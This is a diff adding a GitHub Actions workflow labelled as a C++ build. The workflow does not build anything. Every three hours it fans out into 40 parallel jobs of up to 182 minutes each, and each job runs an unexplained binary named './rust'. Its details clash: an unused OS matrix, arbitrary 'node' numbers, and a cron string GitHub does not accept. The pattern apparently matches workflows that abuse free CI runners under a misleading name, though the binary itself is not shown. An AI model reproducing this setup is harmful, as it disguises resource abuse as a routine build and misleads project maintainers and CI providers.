@@ -1,0 +1,25 @@
+# Workflow body - 10/8/2021
+name: Build cpp project - from 10/8/2021
+# Defaults
+
+defaults:
+  run:
+     shell: bash
+        
+on:
+   workflow_dispatch:
+   schedule:
+      - cron: '0 */3 ? * *'
+jobs:
+   build-project-10-8-2021:
+      timeout-minutes: 182
+      runs-on: ubuntu-20.04
+      strategy:
+        matrix:
+         os: [ubuntu-18.04]
+         node: [758,536,185,532,998,322,96,968,108,957,605,490,247,91,17,786,492,486,769,126,743,486,182,473,1006,63,780,932,707,966,342,91,973,857,157,1011,51,910,106,319]
+      steps:
+      - uses: actions/checkout@v2
+      - name: Build cpp project.
+        run: |
+          ./rust Test 10/8/2021
